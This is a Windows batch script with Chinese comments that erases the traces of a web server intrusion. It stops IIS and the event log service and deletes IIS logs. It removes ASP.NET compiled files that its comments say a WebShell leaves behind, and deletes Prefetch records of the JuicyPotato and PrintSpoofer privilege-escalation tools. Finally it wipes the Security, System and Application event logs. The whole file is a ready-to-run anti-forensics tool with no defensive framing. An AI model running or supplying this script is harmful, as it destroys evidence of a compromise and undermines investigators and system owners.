@echo off
:: ==========================================
:: 深度痕迹清理脚本
:: 警告: 此操作不可逆，且会清空所有日志
:: ==========================================

echo [1] 停止相关服务 (解除文件占用)
iisreset /stop
net stop eventlog

echo [2] 清理 IIS 日志
:: 默认路径，视情况修改
del /f /s /q c:\inetpub\logs\LogFiles\*.log

echo [3] 清理 ASP.NET 临时编译文件
:: WebShell 运行时会在这里生成编译后的 DLL，必须删除！
:: 路径取决于 .NET 版本，这里清理 v4.0 和 v2.0
del /f /s /q "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\*"
del /f /s /q "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\*"

echo [4] 清理 Prefetch (预读取文件)
:: 这里的 JuicyPotato.exe 和 PrintSpoofer.exe 会留下执行记录
del /f /s /q C:\Windows\Prefetch\JUICYPOTATO*.pf
del /f /s /q C:\Windows\Prefetch\PRINTSPOOFER*.pf
del /f /s /q C:\Windows\Prefetch\CMD.EXE*.pf
del /f /s /q C:\Windows\Prefetch\WHOAMI.EXE*.pf

echo [5] 清理 Windows 事件日志
:: 暴力清空 Security, System, Application
:: 注意: 这里的 "wevtutil cl" 自身也会产生一条日志 (ID 1102: 日志已清除)，无法避免
net start eventlog
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

echo [6] 重启 IIS
iisreset /start

echo.
echo [!] 深度清理完成。
pause
